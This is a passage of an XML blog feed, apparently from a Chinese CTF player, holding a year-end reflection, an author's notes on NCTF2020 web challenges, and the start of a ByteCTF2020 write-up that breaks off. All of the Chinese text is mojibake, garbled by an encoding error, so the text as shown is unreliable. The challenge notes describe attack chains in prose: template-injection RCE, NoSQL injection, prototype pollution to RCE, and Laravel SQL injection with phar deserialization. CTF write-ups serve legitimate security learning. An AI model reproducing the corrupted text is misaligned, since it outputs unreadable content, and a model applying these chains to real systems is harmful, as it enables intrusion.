”æˆæœç›¸æå¹¶è®ºã€‚ä½†æ˜¯è¿™ç§ä¸å¹³è¡¡åªæ˜¯æš‚æ—¶çš„ï¼Œæ—¢ç„¶é€‰æ‹©äº†è¿™æ¡è·¯ï¼Œå°±æ²¡æœ‰æ€€ç–‘å…¶æ­£ç¡®æ€§çš„å¿…è¦äº†ã€‚åšæŒèµ°ä¸‹å»å°±å¥½</p><p>å½“ç„¶2020è¿˜æ˜¯æœ‰äº›å°é—æ†¾çš„ï¼Œæ¯”å¦‚æŸäº›æ¯”èµ›æ²¡èƒ½å†²åˆ°å‰åˆ—ï¼Œæ¯”å¦‚å­¦ä¸šä¸Šæœ‰å‡ é—¨è€ƒè¯•ä¸å¤ªæ»¡æ„ï¼Œæ¯”å¦‚è¿˜æ˜¯ç»§ç»­å•èº«ç”Ÿæ´»ï¼ˆææ€•æœ¬ç§‘ç”Ÿæ¶¯è„±ä¸äº†å•äº†ï¼‰,æ¯”å¦‚æ²¡èƒ½åšæŒé”»ç‚¼â€¦â€¦ å¸Œæœ›æ˜å¹´èƒ½æœ‰æ‰€æ”¹è¿›å§ã€‚</p><p>æ€»çš„æ¥è¯´2020è¿˜æ˜¯æ”¶è·æ»¡æ»¡çš„ã€‚æ¯•ç«Ÿå›é¦–ä¸€çœ‹ï¼Œè‡ªå·±ä½œä¸ºä¸€åctferçš„ç¡®æ˜¯ä»ä¸€æ— æ‰€çŸ¥åˆ°èƒ½æœ‰æ‰€è¾“å‡ºäº†ã€‚äººæ€»å½’æ˜¯è¦è¿›æ­¥çš„ï¼Œä»˜å‡ºæœ‰å›æŠ¥æ‰æ˜¯æˆ‘ä¸ªäººçš„ä¿¡æ¡ã€‚æ‰€ä»¥æ¥ä¸‹æ¥çš„ä¸€å¹´ä¹Ÿè¦ç»§ç»­åŠªåŠ›ï¼Œå®Œæˆè‡ªå·±æœ€åçš„å­¦æœ¯æ¢¦æƒ³å§ XP</p><p>ä¹‹å‰çœ‹åˆ°éå¸¸å´‡æ‹œçš„æ—¥æœ¬å¸ˆå‚…å†™ä¸‹çš„è‡ªçœä¸æŠ±è´Ÿï¼Œè®©æˆ‘è§‰å¾—æ¥ä¸‹æ¥ä¹Ÿéœ€è¦æœ‰è§„åˆ’çš„è¡ŒåŠ¨ã€‚</p><p>2020çš„åçœï¼š</p><ul><li>äººå˜å¾—æ‡’æƒ°äº†ï¼Œä¹Ÿè®¸æ˜¯ç–«æƒ…çš„å½±å“ï¼Œä½†æ˜¯ç¡®å®å½±å“äº†æ•ˆç‡</li><li>å­¦golangï¼Œä»¥åŠå†™ä¸€äº›javaé¡¹ç›®çš„flagæ²¡æœ‰æ‹”æ‰</li><li>é”»ç‚¼å°‘äº†ï¼Œå°‘äº†è·‘æ“åå…‰é æ‰“ç¯®çƒä»ç„¶ä¼šæ„Ÿå—åˆ°èº«ä½“æœºèƒ½çš„å¤§å¹…ä¸‹é™</li><li>å»å›¾ä¹¦é¦†å°‘äº†ï¼Œçœ‹ä¹¦æœ¬å­¦ä¹ çš„å¿ƒæ€å˜å¾—æµ®èº</li><li>ä¸Šè¯¾æ‘¸é±¼å¤ªå¤šï¼ˆæ°´è¯¾é™¤å¤–ï¼‰</li></ul><p>2021çš„æŠ±è´Ÿï¼š</p><ul><li>å¼€å‘ï¼štypescripté¡¹ç›®çš„å®Œæˆï¼Œgolangçš„å­¦ä¹ ,javaçš„è¿›ä¸€æ­¥å­¦ä¹ </li><li>ç®—æ³•ï¼šåˆ·leetcode</li><li>é”»ç‚¼ï¼šä¿è¯èº«ä½“å¥åº·ï¼Œäº‰å–å®šæœŸé•¿è·‘ä¸€æ¬¡</li><li>ç§‘ç ”: äº‰å–èƒ½æœ‰æ‰€äº§å‡ºï¼Œè‡³å°‘ä¸è¦åšåˆ°æ¯«æ— è¿›å±•</li><li>å°è¯•ä¸€äº›å¤æ‚çš„æ¼æ´è„šæœ¬ç¼–å†™ï¼Œä¸Šçº¿åˆ°github</li><li>ä¿ç ”åˆ°å¿ƒä»ªçš„é™¢æ ¡</li><li>å¦‚æœæˆäº†ï¼Œä¸‹åŠå¹´å†²å„ç§CTF</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NCTF2020-å‡ºé¢˜å°è®°</title>
      <link href="2020/11/11/NCTF2020-%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/"/>
      <url>2020/11/11/NCTF2020-%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p><img src="https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/%E6%80%BB%E6%A6%9C.png" class="lazyload" data-srcset="https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/%E6%80%BB%E6%A6%9C.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><a id="more"></a><p>nctf2020ç»ˆäºç»“æŸäº†ã€‚æˆ‘æ‰‹å¤´çš„é¢˜ç›®ä¹ŸåŸºæœ¬æ— äº† XD<br>å› ä¸ºè¿™æ¬¡nctfå­¦é•¿ä»–ä»¬è¦æ¥çš„å¥–åŠ±æŒºä¸°åšçš„(xray licenseæˆ‘ä¹Ÿæƒ³è¦å•Š),æ‰€ä»¥å°±æŠŠæ‰‹å¤´çš„é¢˜éƒ½æ”¾å‡ºæ¥äº†ã€‚å¦‚æœéš¾åº¦å¯¹æ–°ç”Ÿæœ‰äº›åŠé€€çš„è¯è¿˜è¯·å¤šå¤šåŒ…æ¶µã€‚æ ¡èµ›å‰å‡ å¤©ï¼Œç”šè‡³ä»¥ä¸ºyyplè¦æ¥å°±ä¸´æ—¶èµ¶å‡ºäº†ä¸€é“bg_laravel,ç»“æœè¢«å¿½æ‚ äº†ã€‚æœ€åå¤§éƒ¨åˆ†å¸ˆå‚…å¯èƒ½éƒ½å»åšç¥¥äº‘æ¯äº†ï¼Œæ‰€ä»¥æ²¡èƒ½è¿‡æ¥æ‰“ï¼Œç®—æ˜¯æ¯”è¾ƒå¯æƒœäº†ã€‚</p><p>è¿™æ¬¡æˆ‘çš„é¢˜ç›®é™¤äº†bg_laravelä»¥å¤–å…¨éƒ½æœ‰äººè§£å‡º.(rmbå¸ˆå‚…è¿˜æœ‰å…¶ä»–å¸ˆå‚…tql)é¢˜ç›®ç¯å¢ƒæ”¾githubä¸Šäº†,å¯ä»¥è‡ªå–å¤ç°ã€‚<br><a href="https://github.com/baiyecha404/My-NCTF2020-Challs" target="_blank" rel="noopener">https://github.com/baiyecha404/My-NCTF2020-Challs</a></p><h2 id="JS-world-11-solves"><a href="#JS-world-11-solves" class="headerlink" title="JS-world [11 solves]"></a>JS-world [11 solves]</h2><p>è¿™é“æ˜¯ä¸“é—¨ä¸ºæ ¡èµ›å‡†å¤‡çš„ç­¾åˆ°é¢˜ç›®ã€‚æ•´ä½“æ€æƒ³ä¸Šå…¶å®å°±æ˜¯æƒ³å±•ç¤ºä¸‹jsåœ¨å‰åç«¯çš„é€šç”¨æ€§ã€‚åªè¦ç†è§£äº†å‰ç«¯æºç å°±èƒ½æ¨æ–­åç«¯é€»è¾‘ã€‚åŒæ—¶ä¹Ÿæƒ³è¯´æ˜å‰ç«¯çš„wafç­‰äºæ²¡æœ‰waf :).åŠ ä¸Š<code>powered by ejs</code>çš„æç¤º,åº”è¯¥ä¸éš¾çœ‹å‡ºç”¨çš„æ˜¯ejsæ¥æ¸²æŸ“htmlä»£ç ã€‚é‚£ä¹ˆç›´æ¥ç”¨ejsçš„è¯­å¥å°±å¯ä»¥RCEäº†.</p><p>æ¯”èµ›çš„æ—¶å€™æœ¬æ¥ä¸€è¡€å¾ˆå¿«å°±å‡ºäº†çš„ï¼Œç»“æœåæ¥åŠå¤©æ²¡äººè§£ã€‚æˆ‘çœ‹äº†çœ¼htmlå‘ç°æœ‰çš„å¸ˆå‚…å·²ç»å¯ä»¥RCEäº†ç»“æœå°±æ˜¯ä¸å»çœ‹æ ¹ç›®å½•çš„flag.txt.é˜¿è¿™â€¦â€¦</p><h2 id="Mango-3-solves"><a href="#Mango-3-solves" class="headerlink" title="Mango [3 solves]"></a>Mango [3 solves]</h2><p>Mango è‡ªç„¶æ˜¯ä¸ºäº†ç©ä¸€ä¸ªmongo &lt;-&gt; mangoçš„æ¢—ã€‚è¿™é“é¢˜çš„èµ·æºæ¯”è¾ƒæœ‰æ„æ€ï¼Œæ¥è‡ªäºä¸ŠåŠå¹´æŸå›½é™…èµ›çš„èµ›é¢˜ã€‚å½“æ—¶é¢˜ç›®è€ƒç‚¹æ˜¯node-serializeçš„ååºåˆ—åŒ–,ä¸è¿‡æˆ‘åœ¨é»‘ç›’æµ‹çš„æ—¶å€™æ„å¤–å‘ç°é‚£é“é¢˜ç›®è¿˜æœ‰nosqlæ³¨å…¥çš„æ¼æ´å­˜åœ¨ã€‚äºæ˜¯åæ¥getshellåç´¢æ€§dumpæºç ä¸‹æ¥ç ”ç©¶äº†ä¸‹ï¼Œä¹Ÿå¤§è‡´æ˜ç™½äº†ä¸ºä»€ä¹ˆä»–çš„é…ç½®ä¼šäº§ç”Ÿnosqlæ³¨å…¥ã€‚åŠ ä¸Šåæ¥å‘ç°è¿™æ ·çš„ä»£ç å†™æ³•å…¶å®è¿˜æŒºå¸¸è§çš„ï¼Œæ‰€ä»¥å¹²è„†å•ç‹¬å‰¥å‡ºæ¥åšæˆnosqlæ³¨å…¥äº†ã€‚</p><p>ä½†æ˜¯æˆ‘çš„å®šä½åªæ˜¯ä¸­ç­‰éš¾åº¦ï¼Œæœ€ååªæœ‰3 solvesæˆ‘ä¹Ÿå¾ˆè¿·ã€‚ä¸çŸ¥é“æ˜¯å› ä¸ºå¤§å®¶æ²¡æœ‰æ¥è§¦è¿‡nosqlæ³¨å…¥è¿˜æ˜¯ä»€ä¹ˆçš„ã€‚æˆ‘ç°åœ¨è§è¿‡çš„å¤§éƒ¨åˆ†nodejså†™çš„é¡¹ç›®æ•°æ®åº“éƒ½æ˜¯ç”¨çš„mongodb,æ„Ÿè§‰å‡ºç°nosqlçš„æ¦‚ç‡è¿˜æ˜¯ä¸å°çš„ã€‚ç¨å¾®éœ€è¦æ›´æ¢æ–¹å¼fuzzçš„åœ°æ–¹å°±æ˜¯jsonä¼ é€’æ•°æ®äº†ã€‚è¿™ä¸ªä¹Ÿç®—æ˜¯æ¯”è¾ƒå¸¸è§çš„trickå§,nodeç”±äºä¼ é€’jsonå¯¼è‡´ä¸å¯¹è±¡æ··æ·†çš„é—®é¢˜ç®€ç›´ä¸è¦å¤ªå¤šã€‚æ‰€ä»¥ç¬¬äºŒä¸ªæç¤ºç»™å‡ºäº†<code>app.use(express.json())</code>ã€‚æ‰‹æŠ–åŠ ä¸€ä¸ªjsonä¸­é—´ä»¶æˆ–è€…å› ä¸ºæŸä¸ªéœ€æ±‚ä¸å¾—ä¸åŠ ä¸­é—´ä»¶(å†™apiæ—¶),å¾ˆæœ‰å¯èƒ½å¸¦æ¥å¥‡æ€ªçš„é—®é¢˜ã€‚æ‰€ä»¥å†™nodeä¼ å‚ä¸€å®šè¦è®°å¾—ç±»å‹æ£€æŸ¥å•Šã€‚</p><h2 id="PackageManager-v1-0-v2-0-7-solves-3-solves"><a href="#PackageManager-v1-0-v2-0-7-solves-3-solves" class="headerlink" title="PackageManager v1.0/v2.0 [7 solves / 3 solves]"></a>PackageManager v1.0/v2.0 [7 solves / 3 solves]</h2><p>PackageManager ç³»åˆ—æ”¾äº†ä¸¤é“é¢˜ã€‚å…¶å®æºç åŸºæœ¬ç›¸å·®ä¸å¤§ï¼Œ2å°±æ˜¯1çš„å‡çº§ç‰ˆã€‚ä¸€å¼€å§‹çš„PackageManager 6æœˆä»½å°±å‡ºå¥½äº†ã€‚ä¸è¿‡åæ¥è¿‡äº†å‡ ä¸ªæœˆåæ„å¤–å‘ç°å±…ç„¶å­˜åœ¨éé¢„æœŸã€‚äºæ˜¯ç´¢æ€§å°±æŠŠéé¢„æœŸæ”¾åˆ°ç¬¬äºŒç‰ˆé‡Œå¹¶ä¸”åŠ éš¾äº†ã€‚è€ƒç‚¹å…¶å®æ˜¯æˆ‘è§‰å¾—å¾ˆå€¼å¾—å»å­¦ä¹ çš„ç”¨å­è¿›ç¨‹æ¥<code>prototype pollution to RCE</code>çš„ä¸€ç§æ‰‹æ®µ.ç›¸æ¯”æ·±æŒ–æ¨¡æ¿æ±¡æŸ“å±æ€§çš„åˆ©ç”¨æ–¹æ³•ï¼Œå­è¿›ç¨‹å¯¼è‡´RCEç®—æ˜¯å¤§å¤§é™ä½äº†åˆ©ç”¨éš¾åº¦ã€‚ç„¶è€Œå›½å†…ç›¸å…³æ–‡ç« è²Œä¼¼ä¸»è¦æ˜¯å…ˆçŸ¥ä¸Šçš„ä¸€ç¯‡kibana cveåˆ†æ,ä¸è¿‡å°±å­è¿›ç¨‹åˆ©ç”¨èŒƒå›´ä¸Šæœ‰äº›å·®é”™ã€‚æ‰€ä»¥å¸Œæœ›å€Ÿæ­¤è®©å¤§å®¶é‡æ–°å…³æ³¨ä¸‹ã€‚</p><p>å½“ç„¶ï¼Œåæ¥æ„å¤–å‘ç°è¿™ä¸ªè€ƒç‚¹ç¬¬5ç©ºé—´çº¿ä¸‹è²Œä¼¼ä¹Ÿå‡ºç°è¿‡,ä¸è¿‡æˆ‘é¢˜ç›®å…ˆå‡ºå¥½çš„233ã€‚</p><p>v2é™¤äº†è¾¾æˆRCEä»¥å¤–,ä¸ºäº†å¢åŠ ä¸€ç‚¹éš¾åº¦ï¼Œç‰¹æ„å°±æŠŠflagæ”¾åˆ°mongodbä¸­äº†ã€‚è¿™ç‚¹æ ¹æ®hint.txtä»¥åŠç›®å½•ä¸‹çš„æ–‡ä»¶æ¥æ¨æ–­åº”è¯¥ä¸æˆé—®é¢˜ã€‚å…¶å®ç›®çš„æ˜¯æ¨¡æ‹Ÿä¸€ä¸ªå¼€å‘ä¸Šçº¿åˆ°ç”Ÿäº§ç¯å¢ƒçš„æƒ…æ™¯ã€‚æ¯”å¦‚åƒæˆ‘è¿™æ ·,å®¹æ˜“è£…äº†æŸä¸ªä¾èµ–å†™ä¸ªdemoï¼Œç„¶åå­—æ®µç•™åˆ°package.jsoné‡Œäº†,æœ¬åœ°åˆ äº†ç›¸å…³jsä»£ç åæ‹¿åˆ°ç”Ÿäº§ç¯å¢ƒä¸‹ç›´æ¥<code>npm install</code> ,å°±å¤šè£…äº†æ²¡æœ‰ç”¨çš„ä¾èµ–ã€‚æ‰€ä»¥è¿™é‡Œå°±èƒ½ç”¨mongodbä¾èµ–è¿æ¥å†…ç½‘mongodbæ‹¿flag.</p><p>ç„¶åæ¯”èµ›å°±ç¿»è½¦äº†â€¦â€¦nunjucksæŠŠæˆ‘ç»™å®³äº†ã€‚ä¹‹æ‰€ä»¥é€‰nunjucksåšæ¨¡æ¿å¼•æ“æœ¬æ¥æ˜¯å› ä¸ºæˆ‘æ‰€çŸ¥é“çš„å¼•æ“é™¤äº†nunjuckså¤–ï¼Œåƒhbs,ejs,pug,jadeéƒ½æ˜¯å¯ä»¥æ±¡æŸ“æ¨¡æ¿RCEçš„ã€‚æ‰€ä»¥æ²¡æœ‰è·Ÿæºç å°±ç›´æ¥æƒ³çœ‹çœ‹æœ‰æ²¡æœ‰äººéé¢„æœŸæ±¡æŸ“nunjuckså±æ€§çš„ï¼ˆp1g3å¸ˆå‚…åº”è¯¥æ˜¯æ‰¾äº†nunjucksçš„æ±¡æŸ“ï¼Œä½†æ˜¯åªèƒ½ç­‰æˆ‘é¶æœºæ¯åˆ†é’Ÿé‡å¯æ‰èƒ½çœ‹ä¸€æ¬¡æ‰§è¡Œç»“æœ,æ²¡æœ‰é¢„æœŸè§£æ–¹ä¾¿ï¼‰ã€‚ç»“æœå‘ç°nunjucksç›´æ¥æ¨¡æ¿æ³¨å…¥æ ¹æœ¬ä¸å—è¿™äº›å½±å“â€¦â€¦ æˆ‘v2æœ¬æ¥ç›®çš„å°±æ˜¯è¯´æ˜å…¶å®ä¸æ­¢fork,ä»»æ„å­è¿›ç¨‹éƒ½å¯ä»¥ç»“åˆæ±¡æŸ“ç¯å¢ƒå˜é‡ç„¶åRCE,æ‰€ä»¥å°±ç”¨äº†<code>execSync(&#39;whoami&#39;)</code>ã€‚ä¸­é—´ä»¶é‡Œè¿˜è€ƒå¯Ÿäº†ä¸€ä¸ªtrickç»•è¿‡debugè·¯ç”±çš„é™åˆ¶.ç»“æœæ¨¡æ¿æ³¨å…¥ç›´æ¥é€šæ€v1,v2 orz</p><p>ä¸è¿‡è²Œä¼¼çœ‹v2çš„äººä¸å¤šï¼Œæ‰€ä»¥æœ€årmbè·Ÿp1g3å¸ˆå‚…åº”è¯¥æ˜¯é¢„æœŸåšçš„ã€‚ä¸€è¡€çš„Somnuså¸ˆå‚…å°±ç›´æ¥éé¢„æœŸæ¨¡æ¿æ³¨å…¥äº†â€¦â€¦ä¸è¿‡éé¢„æœŸä»€ä¹ˆçš„æ— æ‰€è°“,èƒ½æ‹¿flagéƒ½æ˜¯å¥½æ–¹æ³•,å¤§å®¶èƒ½å­¦åˆ°å­è¿›ç¨‹æ±¡æŸ“çš„çŸ¥è¯†æˆ‘å°±æ¯”è¾ƒæ»¡è¶³äº†ã€‚æœ€åæ¯”è¾ƒæ™®éçš„é—®é¢˜æ˜¯æœ‰çš„å¸ˆå‚…è¿æ¥mongodbä»£ç å†™å¥½åæ²¡æœ‰<code>db.close()</code>.é‚£è¿™æœ¬åœ°å¿…ç„¶æ˜¯æ‹¿ä¸åˆ°æŸ¥è¯¢ç»“æœçš„ã€‚</p><h2 id="SimpleSimplePie-1-solves"><a href="#SimpleSimplePie-1-solves" class="headerlink" title="SimpleSimplePie [1 solves]"></a>SimpleSimplePie [1 solves]</h2><p>æŒ–é“¾å­æ˜¯ä¸å¯èƒ½çš„ï¼Œæ‰€ä»¥åªèƒ½è‡ªå·±æ‰‹å†™å‡ ä¸ªä¹±ä¸ƒå…«ç³Ÿçš„ç±»æ¥æ„é€ popé“¾äº†ã€‚æ•´ä½“æ€è·¯æˆ‘æ„Ÿè§‰è·Ÿtpç³»åˆ—çš„pop chain å·®ä¸å¤šï¼Ÿå°±æ˜¯ä¸ªsuper-miniç‰ˆçš„<code>__toString() -&gt; __call() -&gt; call_user_func</code>è°ƒç”¨è‡ªèº«å‡½æ•°ã€‚</p><p>ç„¶ååˆ©ç”¨åˆ™æ¯”è¾ƒæœ‰æ„æ€ã€‚çµæ„Ÿå½“ç„¶å°±æ˜¯ä¹‹å‰åšhtbæ—¶å‘ç°çš„æ–°å§¿åŠ¿ ssrf æ‰“memcacheè§¦å‘ååºåˆ—åŒ–. åæ¥æ„å¤–å‘ç°è¿™æ ·çš„åˆ©ç”¨å…¶å®å®æˆ˜ä¸­è¿˜æŒºä¸å°‘çš„ï¼Œæ¯”å¦‚ä¹‹å‰å®‰æ’ä¿Šæ°å¸ˆå‚…çš„<code>ssrf -&gt; RCEçš„è‰°éš¾åˆ©ç”¨</code>å°±æ˜¯ssrf æ‰“redisè§¦å‘thinkphpååºåˆ—åŒ–.æˆ‘çš„é¢˜ç›¸æ¯”å®æˆ˜è¿˜æ˜¯ç®€å•å¤šäº†ã€‚</p><p>è¿™é‡Œpopé“¾é‡Œæœ‰ä¸ªå°å‘å°±æ˜¯é“¾å­çš„èµ·ç‚¹é€‰<code>__wakeup</code>æœ€å¥½ã€‚æˆ‘è‡ªå·±å½“åˆè°ƒè¯•çš„æ—¶å€™å°±å‘ç°å¦‚æœç”¨<code>__destruct</code>åšèµ·ç‚¹ï¼Œä¼šå› ä¸ºåºåˆ—åŒ–æ•°æ®çš„ä¸€äº›å†…å®¹è§¦å‘simplepieçš„æŠ¥é”™ã€‚æ‰€ä»¥å†™åˆ©ç”¨ç±»æ—¶æ•…æ„åˆéš¾åŠ äº†ä¸ª<code>__destruct</code>å¸Œæœ›è¸©ä¸ªå‘(æˆ‘çˆ¬äº†)ã€‚ä½†æ˜¯å”¯ä¸€è§£å‡ºçš„rmbå¸ˆå‚…åœ¨é€‰æ‹©äº†<code>__destruct</code>åšèµ·ç‚¹åæ˜¯ç”¨äº†phpggcé‡Œçš„fast destruct æ¥è¿›å…¥<code>__destruct</code>ã€‚è¿™å€’ç¡®å®å‡ºä¹æˆ‘æ„æ–™,å­¦åˆ°äº†ã€‚</p><h2 id="bg-laravel-0-solves"><a href="#bg-laravel-0-solves" class="headerlink" title="bg_laravel [0 solves]"></a>bg_laravel [0 solves]</h2><p>æ²¡æƒ³åˆ°æœ€ålaravelæˆäº†é˜²aké¢˜â€¦â€¦å› ä¸ºæ—¶ä¸´æ—¶èµ¶çš„ï¼Œæ‰€ä»¥å¾ˆå¤šåœ°æ–¹å†™çš„ä¸æ˜¯å¾ˆå¥½ï¼Œè¿˜è¯·è§è°…ã€‚ç”šè‡³ç”±sqlæ³¨å…¥åˆ°ä¸Šä¼ getshelléƒ½æ˜¯çµå…‰ä¸€é—ªæƒ³å‡ºæ¥çš„ã€‚</p><p>é¢˜ç›®ä¹‹æ‰€ä»¥ç”¨äº†ä¿å›½å½“ç„¶æ˜¯å› ä¸ºæœ€è¿‘è¢«é©¬è€å¸ˆçš„é¬¼ç•œç»™æ´—è„‘äº†233ã€‚æ‰€ä»¥æˆ‘çš„é¢˜ç›®ä¸Šä¼ ä¸ç»™å›æ˜¾è·¯å¾„ï¼Œå…¶å®æ˜¯å¹´è½»äººä¸è®²æ­¦å¾·ä¸å‘Šè¯‰ä½ æ–‡ä»¶å :) </p><p>é¦–å…ˆåœ¨å›½å†…CTF laravelçš„ååºåˆ—åŒ–æ—©å°±è¢«æ‰“çƒ‚äº†ï¼Œæ‰€ä»¥æˆ‘å°±æƒ³èƒ½ä¸èƒ½å‡ºç‚¹æ–°æ„ã€‚è¯´èµ·æ¥ä¹‹å‰ä¸ƒæœˆç«å¸ˆå‚…çš„laravelæ–‡ç« ä¸‹å±…ç„¶æœ‰äººè¯´æ²¡äººè¿™ä¹ˆå†™æ§åˆ¶å™¨æ‰€ä»¥ååºåˆ—åŒ–æ²¡æœ‰ç”¨ï¼Œè¿™å°±æ¥æ‰“è„¸ã€‚ä¼—æ‰€å‘¨çŸ¥,pharååºåˆ—åŒ–ç›´æ¥æ‰©å®½äº†phpååºåˆ—åŒ–çš„åˆ©ç”¨é¢ã€‚ä¸€ä¸ªlaravelç«™é‡Œå‡ºç°çš„æ–‡ä»¶æµæ“ä½œç»å¯¹ä¸å°‘ï¼Œé‚£ä¹ˆå¦‚æœèƒ½æœ‰å¯æ§ç‚¹è§¦å‘pharååºåˆ—åŒ–,ç»“åˆpopé“¾ç›´æ¥å°±èƒ½getshell.</p><p>ä½†æ˜¯è¿™ä¹ˆè€ƒå¤ªç®€å•äº†ï¼Œæ‰€ä»¥è‡ªç„¶æ˜¯åŠ ç‚¹èŠ±ã€‚</p><p>åˆšå¥½æˆ‘æœ€è¿‘æ¥è§¦åˆ°äº†laravel 5.8.10çš„å¾ˆå†·é—¨çš„sqlæ³¨å…¥ã€‚å†·é—¨ä¸»è¦æ˜¯å› ä¸ºgithubä¸Šä¿®å¤éƒ½åªæ˜¯è¯´ä¿®å¤äº†é€ƒé€¸å•å¼•å·çš„æ¼æ´,è€Œä¸æ˜¯æ˜è¯´çš„sqlæ³¨å…¥æ¼æ´ã€‚è€Œä¸”åˆ©ç”¨æ¡ä»¶ä¹Ÿæœ‰ç‚¹è‹›åˆ»ï¼Œä¸€ä¸ªæ˜¯è¦è¾“å…¥å¯æ§,å¦ä¸€ä¸ªæ˜¯å›æ˜¾å¾—æœ‰jsonæ•°æ®,å¦åˆ™<code>json_extract()</code>ä¼šæŠ¥é”™ã€‚wpé‡Œç»™çš„å‚è€ƒæ–‡ç« ä¹Ÿåªæ˜¯è¯´äº†<code>addSelect()</code>,<code>select()</code> + jsonå›æ˜¾çš„æ•°æ®å¯èƒ½ä¼šå¯¼è‡´sqlæ³¨å…¥ã€‚å¯å®é™…ä¸Šï¼Œé¢˜ç›®ä¸­å‡ºç°çš„<code>orderby()</code>ä¹Ÿæ˜¯å¯ä»¥æ³¨å…¥çš„ã€‚è¿™å°±è¦çœ‹å¸ˆå‚…ä»¬è‡ªå·±debugäº†ã€‚æˆ‘è‡ªå·±æ˜¯å½“åˆç›´æ¥wrapJsonPathé‚£ä¸‹æ–­ç‚¹ç¢°è¿æ°”åœ¨å¯æ§ä½ç½®ä¸€ä¸ªä¸ªå°è¯•è§¦å‘æ‰å‘ç°çš„ã€‚</p><p>sqlæ³¨å…¥æ€ä¹ˆè·Ÿpharååºåˆ—åŒ–ç»“åˆå‘¢ï¼Ÿé™¤å¼€å¯æ§çš„<code>phar://</code>è¾“å…¥ç‚¹ï¼Œæˆ‘ç¬¬ä¸€æƒ³æ³•æ˜¯æŠŠä¸Šä¼ çš„æ–‡ä»¶åéšæœºåŒ–ï¼Œç„¶åæŠŠæ–‡ä»¶åä¹‹ç±»çš„ä¿å­˜åœ¨mysqlé‡Œã€‚ä½†æ˜¯å¾ˆæœ‰æ„æ€çš„æ˜¯ï¼Œæˆ‘åœ¨ç½‘ä¸Šæ‰¾äº†ä¸å°‘laravelçš„æ–‡ä»¶ä¸Šä¼ éƒ½ç”¨äº†ORM,ä¹Ÿå°±æ˜¯è¯´,Fileç±»æ˜¯ä¸ªEloquent model.æ‰§è¡Œ<code>$file-&gt;save()</code>æ—¶å¯¹åº”çš„æ•°æ®å°±éƒ½åˆ°äº†æ•°æ®åº“é‡Œäº†,æ­£åˆæˆ‘æ„ã€‚</p><p>æ‰€ä»¥å¯èƒ½å¤§éƒ¨åˆ†å¸ˆå‚…è¢«è¿™ä¸ªå†·é—¨çš„laravel sqlæ³¨å…¥ç»™éš¾ä½äº†ã€‚æ‰€ä»¥è¿˜æ˜¯è¦å¤šè°·æ­Œ+æŸ¥çœ‹å®˜æ–¹è¿™ä¸ªç‰ˆæœ¬çš„ä¸€äº›å°æ”¹åŠ¨,è¯´ä¸å®šå°±èƒ½å®šä½æ¼æ´ç‚¹äº†ã€‚</p><h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>  æ€»ä¹‹è¿™æ¬¡æ¯”èµ›èƒ½çœ‹åˆ°å¸ˆå‚…ä»¬åšè‡ªå·±çš„é¢˜,é¡ºä¾¿äº¤æµä¸‹æ€è·¯è¿˜æ˜¯æ¯”è¾ƒå¼€å¿ƒçš„ã€‚å¸Œæœ›å¤§å®¶æ˜å¹´èƒ½æ¥ç€æ¥ç©ï¼Œä¹Ÿå¯ä»¥æœŸå¾…ä¸‹ä¸çŸ¥é“æœ‰æ²¡æœ‰çš„X1CTF </p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ByteCTF2020-easyscrapy</title>
      <link href="2020/10/26/ByteCTF2020-easyscrapy/"/>
      <url>2020/10/26/ByteCTF2020-easyscrapy/</url>
      
        <content type="html"><![CDATA[<p> è¿™æ¬¡ByteCTFçš„webé¢˜éš¾åº¦å±å®ç¦»è°±ã€‚å¥½å‡ é“é¢˜å‡ ä¹éƒ½æ— æ³•ä¸‹æ‰‹ã€‚è‡ªå·±ç¬¬ä¸€å¤©ä¸»è¦æ˜¯çœ‹äº†easyscrapyä»¥åŠé…äº†beakerçš„ç¯å¢ƒ(ç»“æœæ ¹æœ¬æ“ä½œä¸èµ·æ¥ï¼Œäºæ˜¯æ”¾å¼ƒäº†â€¦â€¦)ç¬¬äºŒå¤©ä¸Šåˆåœ¨é…scrapyçš„ç¯å¢ƒï¼Œä¸€ç›´åˆ°ä¸‹åˆæ‰å‡ºæ€è·¯,åŸºæœ¬ä¸Šç»™æˆ‘å‡ å°æ—¶å°±èƒ½å‡ºäº†ã€‚ç„¶è€Œå› ä¸ºè¦èµ¶é£æœºç»“æœæ²¡æ—¶é—´åšäº†â€¦â€¦æ™šä¸Šåˆ°äº†åæ€»å½’æ˜¯æŠŠé¢˜ç›®åšå‡ºæ¥äº†ã€‚åªèƒ½è¯´æœ‰ç‚¹å¯æƒœï¼Œä¸ç„¶å¯ä»¥ä¸ºå°ç»¿è‰æ‹¿ä¸ªä¸‰/å››è¡€çš„ã€‚</p><p>è¿™é‡Œæˆ‘åˆ†äº«ä¸‹è‡ªå·±ä¸€è·¯ä¸‹æ¥çš„ä¸»è¦æ€è·¯å§ã€‚å¸Œæœ›èƒ½å¯¹ä»–äººæœ‰æ‰€å¸®åŠ©ã€‚å¦å¤–å†™æ–‡ç« æ—¶ç¯å¢ƒå·²ç»å…³äº†ï¼Œæ²¡å•¥å›¾ï¼Œå°†å°±ç€çœ‹å§</p><a id="more"></a><h2 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h2><p>é¦–å…ˆé¢˜ç›®æœ¬èº«ç»™å‡ºäº†ä¸€ä¸ªåŠŸèƒ½å¯ä»¥è®©æˆ‘ä»¬è¾“å…¥urlä»¥åŠä¸€ä¸ªéªŒè¯ç ï¼Œä½†æ˜¯æ³¨æ„åˆ°è¿™é‡Œcookieæ˜¯flaskçš„session,å­˜å‚¨çš„å†…å®¹ä¸æ¯æ¬¡é¡µé¢å›æ˜¾çš„éªŒè¯ç 